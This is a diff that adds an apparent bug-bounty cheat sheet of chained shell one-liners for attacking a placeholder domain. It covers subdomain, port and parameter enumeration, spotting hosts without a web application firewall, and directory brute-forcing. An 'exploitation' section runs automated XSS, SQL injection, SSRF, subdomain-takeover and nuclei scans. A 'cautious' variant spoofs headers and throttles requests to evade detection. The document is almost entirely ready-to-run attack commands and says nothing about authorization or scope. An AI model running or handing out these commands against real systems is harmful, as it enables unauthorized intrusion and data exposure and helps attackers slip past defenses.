@@ -1,0 +1,76 @@
+ _____                                     _   _             
+|  ___|                                   | | (_)            
+| |__ _ __  _   _ _ __ ___   ___ _ __ __ _| |_ _  ___  _ __  
+|  __| '_ \| | | | '_ ` _ \ / _ \ '__/ _` | __| |/ _ \| '_ \ 
+| |__| | | | |_| | | | | | |  __/ | | (_| | |_| | (_) | | | |
+\____/_| |_|\__,_|_| |_| |_|\___|_|  \__,_|\__|_|\___/|_| |_|
+                                                             
+                                                             
+
+MAIN ENUMERATION COMMAND
+TARGET="target.com" && subfinder -d $TARGET >> subs.txt && waybackurls $TARGET >> subs.txt && gau $TARGET >> subs.txt && assetfinder --subs-only $TARGET >> subs.txt && sort -u subs.txt -o subs.txt && httpx -l subs.txt -o all_subdomains.txt && rm subs.txt && grep -Eo '([a-z0-9.-]+\.)?target\.com' all_subdomains.txt | sort -u > clean_subdomains.txt
+
+FIND JS AND JSON FILES
+grep -Ei '\.js($|\?)' all_subdomains.txt > js_urls.txt && grep -Ei '\.json($|\?)' all_subdomains.txt > json_urls.txt && katana -list js_urls.txt -js-crawl -o js_urls2.txt && cat js_urls.txt js_urls2.txt | sort -u > js_urls_combined.txt && mv js_urls_combined.txt js_urls.txt && rm js_urls2.txt
+
+FIND ALL PORTS
+naabu -list clean_subdomains.txt -p - -o naabu_output.txt && cat naabu_output.txt | httpx -o clean_port_readable_subdomains.txt -title -tech-detect -status-code -server -ip && cat naabu_output.txt | httpx -o clean_port_non_readable_subdomains.txt && rm naabu_output.txt
+
+FIND 403 SUBDOMAINS AND NOWAF SUBDOMAINS / TRY TO DIRECTORY BRUTEFORCE NEW THINGS
+cat all_subdomains.txt | parallel -j10 'echo "[*] Testing {}" >&2; wafw00f {} 2>/dev/null | grep -q "No WAF detected" && echo {}' > nowaf_subdomains.txt && cat all_subdomains.txt | parallel -j10 'status=$(curl -o /dev/null -s -w "%{http_code}" -k -L {}); if [ "$status" = "403" ]; then echo {}; fi' > 403_subdomains.txt
+
+mkdir -p ~/bugbounty/reports && cat 403_subdomains.txt | xargs -P10 -I{} bash -c 'PYTHONWARNINGS="ignore" dirsearch -u "{}" -e php,html,js,json,txt,log,zip,conf,sql -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --threads 30 --timeout 10 --retries 2 --follow-redirects --full-url --output ~/bugbounty/reports/$(echo "{}" | sed "s|https\?://||;s|/|_|g").txt'
+
+FIND PARAMETERS / FULL URLS FOR EACH SUBDOMAIN
+paramspider -l clean_subdomains.txt && cat results/*.txt > param_urls_temp.txt && sort -u param_urls_temp.txt -o param_urls.txt && arjun -i param_urls.txt -o arjun_output.txt && cat param_urls.txt arjun_output.txt | sort -u > combined_params.txt && rm -rf results param_urls_temp.txt arjun_output.txt
+
+FIND TECHNOLOGIES USED IN EVERY SUBDOMAIN
+httpx -l all_subdomains.txt -tech-detect >> technologies.txt
+
+https://beautifier.io/
+https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/
+
+
+ _____           _       _ _        _   _             
+|  ___|         | |     (_) |      | | (_)            
+| |____  ___ __ | | ___  _| |_ __ _| |_ _  ___  _ __  
+|  __\ \/ / '_ \| |/ _ \| | __/ _` | __| |/ _ \| '_ \ 
+| |___>  <| |_) | | (_) | | || (_| | |_| | (_) | | | |
+\____/_/\_\ .__/|_|\___/|_|\__\__,_|\__|_|\___/|_| |_|
+          | |                                         
+          |_|                                         
+
+EXPLOIT XXS, SQLI, AND SSRF
+cat param_urls.txt | gf xss > xss_candidates.txt && cat param_urls.txt | gf sqli > sqli_candidates.txt && cat param_urls.txt | gf ssrf > ssrf_candidates.txt
+dalfox file xss_candidates.txt
+sqlmap -m sqli_candidates.txt --batch
+cat ssrf_candidates.txt | openredirex -p openredirex/payloads.txt -k "FUZZ" -c 50
+
+EXPLOIT SUBDOMAIN TAKEOVER
+subzy run --targets clean_subdomains.txt
+
+POSSIBLE SCANS WITH NUCLEI
+nuclei -l all_subdomains.txt -severity high,critical -rate-limit 150
+nuclei -l js_urls.txt -tags exposure,token,js -severity low,medium,high -rate-limit 100
+nuclei -l json_urls.txt -tags api,exposure -severity medium,high -rate-limit 80
+nuclei -l sqli_candidates.txt -tags sqli
+nuclei -l xss_candidates.txt -tags xss
+nuclei -l ssrf_candidates.txt -tags ssrf
+nuclei -u "https://example.com/"
+
+CHECK FOR ANY OUTDATED JS MODULES
+mkdir -p js_tmp && cd js_tmp && xargs -n 1 -P 10 curl -sO < ../js_urls.txt && retire --path . && cd .. && rm -rf js_tmp
+
+USEFUL DIRECTORY BRUTEFORCING COMMANDS / COMMANDS TO DIRECTORY BRUTEFORCE ALL FOUND SUBDOMAINS
+dirsearch -u http://target.com/v1 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,js,jpg,png,html,json,txt -t 50 --follow-redirects
+
+dirsearch -u http://target.com/v1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,js,jpg,png,html,json,txt -t 50 --follow-redirects
+
+while read url; do dirsearch -u https://$url/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,js,jpg,png,html,json,txt -t 50 --follow-redirects; done < clean_subdomains.txt
+
+while read url; do dirsearch -u "$url/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,js,jpg,png,html,json,txt -t 50 --follow-redirects; done < clean_port_non_readable_subdomains.txt
+
+CAUTIOUS DIRECTORY BRUTEFORCING COMMAND
+dirsearch -u http://target.com/v1 -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -H "Referer: https://google.com" -H "X-Forwarded-For: 127.0.0.1" --random-agent --delay 0.5 --max-rate 20 --threads 50 --timeout 10 --exclude-sizes 0
+
+while read url; do dirsearch -u "$url/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,js,jpg,png,html,json,txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -H "Referer: https://google.com" -H "X-Forwarded-For: 127.0.0.1" --random-agent --delay 0.5 --max-rate 20 --threads 50 --timeout 10 --exclude-sizes 0 --follow-redirects; done < clean_port_non_readable_subdomains.txt
